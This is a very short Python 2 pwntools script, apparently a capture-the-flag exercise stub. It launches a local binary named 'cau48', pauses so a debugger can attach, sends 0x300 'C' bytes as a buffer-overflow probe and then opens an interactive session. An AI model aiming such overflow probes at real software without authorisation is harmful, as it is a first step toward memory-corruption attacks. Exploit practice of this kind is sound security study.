from pwn import *
import time
import sys

def cau48():
	r = process("./cau48")
	raw_input("debug?")
	r.send("C"*0x300)
	print r.recv()
	r.interactive()

cau48()